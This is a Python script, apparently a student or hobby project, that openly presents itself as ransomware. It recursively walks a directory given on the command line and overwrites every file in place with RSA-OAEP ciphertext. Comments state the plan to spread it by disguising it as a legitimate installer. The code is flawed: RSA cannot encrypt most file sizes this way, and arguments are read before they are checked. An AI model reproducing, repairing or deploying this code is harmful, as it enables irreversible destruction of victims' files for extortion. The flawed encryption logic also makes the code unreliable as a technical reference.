# import libraries 
import os # for file operations
import sys # for command line arguments
import time # for timing the program
from Crypto.PublicKey import RSA #for encryption
from Crypto.Cipher import PKCS1_OAEP #for creating a cipher 


# we want to create a ransomware that will encrypt a given directory and all of its subdirectories recursively
# ideally, we want to encrypt all files except for the ransomware itself
# we want to infect the system by mocking a legitimate program that requires installation of an exe file

# start the attack by asking a user for a directory to encrypt
# we will use the command line arguments to get the directory to encrypt

#encrypting file
def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as original_file:
        original_content = original_file.read()

    key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(key)
    encrypted_content = cipher.encrypt(original_content)

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_content)

#scanning directories recursively and encrypting each file
def encrypt_directory(directory, public_key):
    for root, dirs, files in os.walk(directory):
        print(f"Scanning directory: {root}")
        
        for dir in dirs:
            dir_path = os.path.join(root,dir)
            print(f"Found directories: {dir_path}")

        for file in files:
            file_path = os.path.join(root, file)
            print(f"Found file: {file_path}")

            encrypt_file(file_path, public_key)

    
#We use the directory passed from the command
directory = sys.argv[1]

#opening the public key file
with open('publicKey.pem', 'rb') as pub:
    key = pub.read()


# # we will use the command line arguments to get the directory to encrypt
if len(sys.argv) < 2:
     print("Usage: python3 ransomware.py <directory>")
     sys.exit(1)

# # if the directory does not exist, we will exit the program
if not os.path.exists(directory):
     print("Directory does not exist")
     sys.exit(1)


#encrypting the directory
encrypt_directory(directory,key)






